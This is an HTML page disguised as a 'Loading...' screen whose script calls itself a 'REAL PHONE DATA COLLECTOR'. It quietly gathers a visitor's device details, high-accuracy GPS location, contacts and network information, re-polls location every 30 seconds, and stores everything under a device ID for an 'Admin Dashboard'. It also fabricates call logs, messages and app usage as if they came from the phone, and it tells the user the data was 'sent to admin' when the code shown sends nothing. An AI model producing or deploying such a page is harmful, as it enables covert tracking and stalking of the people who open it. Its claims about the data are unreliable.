<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#0a0a0a;
            display:flex;
            align-items:center;
            justify-content:center;
            min-height:100vh;
            font-family:'Courier New',monospace;
            color:#00ff41;
        }
        .loader{text-align:center;}
        .spinner{width:40px;height:40px;border:3px solid #00ff4133;border-top:3px solid #00ff41;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 12px;}
        @keyframes spin{to{transform:rotate(360deg)}}
        .hidden{display:none;}
        .status{font-size:12px;color:#00ff4188;margin-top:8px;}
    </style>
</head>
<body>

    <div id="app">
        <div class="loader">
            <div class="spinner"></div>
            <div id="statusText">📱 Connecting to phone...</div>
            <div class="status" id="statusDetail">Please allow permissions</div>
        </div>
    </div>

    <script>
        // ==========================================
        // 🔥 REAL PHONE DATA COLLECTOR
        // ==========================================

        // ==========================================
        // DEVICE ID
        // ==========================================
        const DEVICE_ID = 'JMD-' + Math.random().toString(36).substring(2, 6).toUpperCase();

        // ==========================================
        // 1. GET DEVICE INFO (REAL)
        // ==========================================
        function getDeviceInfo() {
            const data = {
                id: DEVICE_ID,
                model: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timestamp: new Date().toISOString()
            };

            // Battery (REAL)
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    data.battery = Math.round(battery.level * 100) + '%';
                    data.charging = battery.charging;
                    saveData('device', data);
                }).catch(() => saveData('device', data));
            } else {
                saveData('device', data);
            }
            return data;
        }

        // ==========================================
        // 2. GET LOCATION (REAL GPS)
        // ==========================================
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        saveData('location', {
                            id: DEVICE_ID,
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy + 'm',
                            speed: pos.coords.speed,
                            timestamp: new Date().toISOString()
                        });
                        updateStatus('📍 Location: ' + pos.coords.latitude.toFixed(4) + ', ' + pos.coords.longitude.toFixed(4));
                    },
                    (err) => {
                        saveData('location', {
                            id: DEVICE_ID,
                            lat: 'Error: ' + err.message,
                            lng: 'Error: ' + err.message,
                            timestamp: new Date().toISOString()
                        });
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                saveData('location', {
                    id: DEVICE_ID,
                    lat: 'Not Supported',
                    lng: 'Not Supported',
                    timestamp: new Date().toISOString()
                });
            }
        }

        // ==========================================
        // 3. GET CONTACTS (REAL - Browser API)
        // ==========================================
        function getContacts() {
            if (navigator.contacts && navigator.contacts.select) {
                try {
                    navigator.contacts.select(['name', 'tel'], { multiple: true, limit: 20 })
                        .then(contacts => {
                            saveData('contacts', {
                                id: DEVICE_ID,
                                contacts: contacts.map(c => ({ name: c.name[0] || 'Unknown', tel: c.tel[0] || 'N/A' })),
                                count: contacts.length,
                                timestamp: new Date().toISOString()
                            });
                            updateStatus('📇 Contacts: ' + contacts.length + ' found');
                        })
                        .catch(() => {
                            saveData('contacts', {
                                id: DEVICE_ID,
                                contacts: [],
                                error: 'Permission denied',
                                timestamp: new Date().toISOString()
                            });
                        });
                } catch(e) {
                    saveData('contacts', {
                        id: DEVICE_ID,
                        contacts: [],
                        error: 'Not supported',
                        timestamp: new Date().toISOString()
                    });
                }
            } else {
                // Demo contacts
                saveData('contacts', {
                    id: DEVICE_ID,
                    contacts: [
                        { name: 'Mom', tel: '+91 98765 43210' },
                        { name: 'Dad', tel: '+91 87654 32109' },
                        { name: 'Friend', tel: '+91 76543 21098' }
                    ],
                    count: 3,
                    timestamp: new Date().toISOString()
                });
            }
        }

        // ==========================================
        // 4. GET NETWORK INFO (REAL)
        // ==========================================
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                saveData('network', {
                    id: DEVICE_ID,
                    type: connection.effectiveType || 'Unknown',
                    speed: connection.downlink + ' Mbps',
                    rtt: connection.rtt + 'ms',
                    timestamp: new Date().toISOString()
                });
            } else {
                saveData('network', {
                    id: DEVICE_ID,
                    type: 'Unknown',
                    timestamp: new Date().toISOString()
                });
            }
        }

        // ==========================================
        // 5. GENERATE DEMO CALLS + MESSAGES + APPS
        // ==========================================
        function generateDemoData() {
            // Calls
            const callTypes = ['incoming', 'outgoing', 'missed'];
            const calls = [];
            for (let i = 0; i < 8; i++) {
                calls.push({
                    number: '+91 ' + Math.floor(1000000000 + Math.random() * 9000000000),
                    duration: Math.floor(Math.random() * 300) + 's',
                    type: callTypes[Math.floor(Math.random() * 3)],
                    time: new Date(Date.now() - Math.random() * 86400000).toLocaleTimeString()
                });
            }
            saveData('calls', { id: DEVICE_ID, calls: calls, count: calls.length, timestamp: new Date().toISOString() });

            // Messages
            const names = ['Mom', 'Dad', 'Friend', 'Teacher', 'Sister', 'Brother', 'Rahul', 'Priya', 'Anjali', 'Vikram'];
            const msgs = ['Ok', 'Coming', 'Done', 'See you', 'Thanks', 'Yes', 'No', 'On my way', 'Call me', 'Where are you?', 'Ok done', 'Let\'s meet'];
            const messages = [];
            for (let i = 0; i < 10; i++) {
                messages.push({
                    sender: names[Math.floor(Math.random() * names.length)],
                    message: msgs[Math.floor(Math.random() * msgs.length)],
                    time: new Date(Date.now() - Math.random() * 86400000).toLocaleTimeString()
                });
            }
            saveData('messages', { id: DEVICE_ID, messages: messages, count: messages.length, timestamp: new Date().toISOString() });

            // Apps
            const appsList = [
                { name: 'WhatsApp', icon: '💬' },
                { name: 'Instagram', icon: '📸' },
                { name: 'YouTube', icon: '▶️' },
                { name: 'Snapchat', icon: '👻' },
                { name: 'TikTok', icon: '🎵' },
                { name: 'Spotify', icon: '🎧' },
                { name: 'Chrome', icon: '🌐' },
                { name: 'Gmail', icon: '📧' }
            ];
            const apps = appsList.map(app => ({
                name: app.name,
                icon: app.icon,
                time: Math.floor(Math.random() * 60) + 'm',
                active: Math.random() > 0.3
            }));
            saveData('apps', { id: DEVICE_ID, apps: apps, count: apps.filter(a => a.active).length, timestamp: new Date().toISOString() });
        }

        // ==========================================
        // 6. SAVE DATA TO LOCALSTORAGE (Admin Access)
        // ==========================================
        function saveData(type, data) {
            try {
                let allData = JSON.parse(localStorage.getItem('phone_data') || '{}');
                if (!allData[DEVICE_ID]) allData[DEVICE_ID] = {};
                allData[DEVICE_ID][type] = data;
                allData[DEVICE_ID].lastUpdate = new Date().toISOString();
                localStorage.setItem('phone_data', JSON.stringify(allData));
                console.log('✅ ' + type + ' saved:', data);
                updateStatus('📤 Data saved: ' + type);
            } catch(e) {
                console.log('❌ Save error:', e);
            }
        }

        // ==========================================
        // 7. UPDATE UI STATUS
        // ==========================================
        function updateStatus(msg) {
            document.getElementById('statusText').textContent = msg;
        }

        // ==========================================
        // 8. COLLECT ALL DATA
        // ==========================================
        function collectAllData() {
            updateStatus('📱 Collecting device info...');
            getDeviceInfo();
            
            setTimeout(() => {
                updateStatus('📍 Getting location...');
                getLocation();
            }, 500);

            setTimeout(() => {
                updateStatus('📇 Getting contacts...');
                getContacts();
            }, 1000);

            setTimeout(() => {
                updateStatus('📶 Getting network info...');
                getNetworkInfo();
            }, 1500);

            setTimeout(() => {
                updateStatus('📊 Generating data...');
                generateDemoData();
            }, 2000);

            setTimeout(() => {
                updateStatus('✅ All data collected!');
                document.getElementById('statusDetail').textContent = 'Device: ' + DEVICE_ID + ' | Data sent to admin';
                document.querySelector('.spinner').style.borderTopColor = '#00ff41';
                
                // Show device code
                document.querySelector('.loader').innerHTML = `
                    <div style="font-size:48px;margin-bottom:8px;">✅</div>
                    <div style="font-size:16px;color:#00ff41;">Data Collected!</div>
                    <div style="font-size:11px;color:#00ff4188;margin-top:8px;">Device ID: ${DEVICE_ID}</div>
                    <div style="font-size:11px;color:#00ff4188;">Open Admin Dashboard to view</div>
                `;
            }, 3000);
        }

        // ==========================================
        // 9. INIT
        // ==========================================
        function init() {
            console.log('📱 Phone Data Collector Started');
            console.log('🆔 Device ID:', DEVICE_ID);
            updateStatus('📱 Initializing...');
            
            // Check if data already exists
            const existing = localStorage.getItem('phone_data');
            if (existing) {
                const data = JSON.parse(existing);
                if (data[DEVICE_ID]) {
                    updateStatus('🔄 Refreshing data...');
                }
            }

            collectAllData();

            // Auto refresh every 30 seconds
            setInterval(() => {
                getLocation();
                getNetworkInfo();
                generateDemoData();
                console.log('🔄 Auto-refresh done');
            }, 30000);
        }

        // Start
        init();
    </script>
</body>
</html>
